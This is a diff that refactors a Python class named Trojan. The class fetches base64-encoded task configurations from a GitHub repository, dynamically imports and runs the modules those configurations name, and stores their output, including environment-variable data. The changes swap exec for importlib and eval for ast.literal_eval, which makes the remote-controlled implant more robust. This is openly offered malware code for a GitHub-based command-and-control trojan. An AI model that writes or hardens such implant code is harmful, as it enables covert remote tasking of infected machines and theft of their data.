@@ -1,4 +1,3 @@
-import github3
 import base64
 import sys
 import json
@@ -6,17 +5,15 @@ import threading
 import time
 import random
 import os
+import importlib  # Import importlib to use import_module
 
 
 from datetime import datetime  
-from modules.gitconnect import github_connect, get_file_contents
+from modules.gitimporter import github_connect, get_file_contents
 
 
 class Trojan:
     def __init__(self, id):
-        """
-        Initialize the Trojan class with an ID, configuration file, and repository connection.
-        """
         self.id = id
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
@@ -24,9 +21,6 @@ class Trojan:
 
 
     def get_config(self):
-        """
-        Retrieve the configuration file from the GitHub repository and decode it.
-        """
         try:
             config_json = get_file_contents('config', self.config_file, self.repo)
             config = json.loads(base64.b64decode(config_json).decode('utf-8'))
@@ -37,7 +31,8 @@ class Trojan:
         for task in config:
             if task['module'] not in sys.modules:
                 try:
-                    exec(f"import {task['module']}")
+                    # Use importlib.import_module instead of __import__
+                    importlib.import_module(task['module'])
                 except Exception as e:
                     print(f"[ERROR] Failed to import module {task['module']}: {e}")
         return config
@@ -52,14 +47,17 @@ class Trojan:
                 if module in sys.builtin_module_names:
                     print(f"[INFO] Skipping built-in module: {module}")
                     return
-                raise ImportError(f"Module {module} is not loaded.")
+                # Try to import the module using importlib.import_module
+                importlib.import_module(module)
+                if module not in sys.modules:
+                    raise ImportError(f"Module {module} is not loaded.")
+
             result = sys.modules[module].run()
             self.store_module_result(result)
         except ImportError as e:
             print(f"[ERROR] Failed to import module {module}: {e}")
         except Exception as e:
             print(f"[ERROR] Failed to run module {module}: {e}")
-
 
 
     def store_module_result(self, data):
@@ -76,7 +74,9 @@ class Trojan:
                 result_data = json.dumps({key: str(value) for key, value in data.items()}, indent=4)
             elif isinstance(data, str) and data.startswith("environ"):
                 # Parse 'environ' format and split it into readable lines
-                environ_data = eval(data.replace("environ", ""))  # Safely evaluate the dictionary-like content
+                # Use ast.literal_eval for safer evaluation
+                import ast
+                environ_data = ast.literal_eval(data.replace("environ", ""))
                 result_data = json.dumps(environ_data, indent=4)
             else:
                 # Handle other data types
